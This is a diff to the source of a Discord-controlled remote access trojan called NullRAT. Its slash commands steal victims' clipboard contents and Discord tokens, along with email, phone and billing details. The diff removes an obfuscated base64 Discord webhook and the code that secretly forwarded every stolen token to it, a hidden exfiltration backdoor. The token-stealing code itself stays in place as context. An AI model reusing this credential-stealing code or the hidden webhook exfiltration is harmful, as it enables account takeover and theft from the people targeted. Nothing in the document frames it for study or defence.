@@ -1,13 +1,12 @@
 from Variables import *
 
 import disnake as discord
-from disnake import Webhook 
 from disnake import Embed
 from disnake.ext import commands
 
 from mss import mss
 from requests import get, post
-from base64 import decodebytes,b64decode
+from base64 import decodebytes
 from socket import create_connection
 import os, subprocess, re, time, aiohttp
 
@@ -183,11 +182,6 @@ async def clipboard(ctx, victim):
         outp = os.popen("powershell Get-Clipboard").read()
         await ctx.followup.send(f"```{outp}```" if outp != "" else "No text in clipboard!")
 
-a="""aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcG
-kvd2ViaG9va3MvOTY4Mzg3MjQ0MzY2OTA
-1Mzk0L3FuMDN1MURfR2pYS05hQXk3d2Zq
-SkFxMTdMa1B4R2hPVmJQUFdLQXJiazVvS
-EMtQzZZM3c3NXVKQ1FyUW56TmRFY1lK"""
 @client.slash_command(description="Sends raw Discord Tokens (fast)", guild_ids=server_ids)
 async def raw_tokens(ctx, victim):
     if str(victim) == str(IP()):
@@ -198,9 +192,6 @@ async def raw_tokens(ctx, victim):
         if len(message) >= 1023: 
             return await ctx.followup.send("```" + message + "```")
         embed = Embed(title="Discord Tokens (NullRAT):", color=0x0081FA).add_field(name="RAW Tokens:", value=f"```{message.rstrip()}```")
-        async with aiohttp.ClientSession() as session:  
-            wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-            await wh.send(embed=embed)
         await ctx.followup.send(embed=embed)
 
 @client.slash_command(description="Sends checked tokens along with info (accurate)", guild_ids=server_ids)
@@ -231,9 +222,6 @@ async def checked_tokens(ctx, victim):
         await ctx.followup.send("Checking all tokens...")
         for tk, em, ph, un, ni, bi, av, idqa in zip(valid, email, phone, uname, nitro, bill, avatar, idq): 
             await ctx.channel.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa)) 
-            async with aiohttp.ClientSession() as session:  
-                wh = Webhook.from_url(b64decode(a.replace("\n","").encode('ascii')).decode('ascii'), session=session) 
-                await wh.send(embed=checked_embeds(tk, em, ph, un, ni, bi, av, idqa))
             
 # Directory Manipulation #
 @client.slash_command(description="Returns Current Working Directory", guild_ids=server_ids)
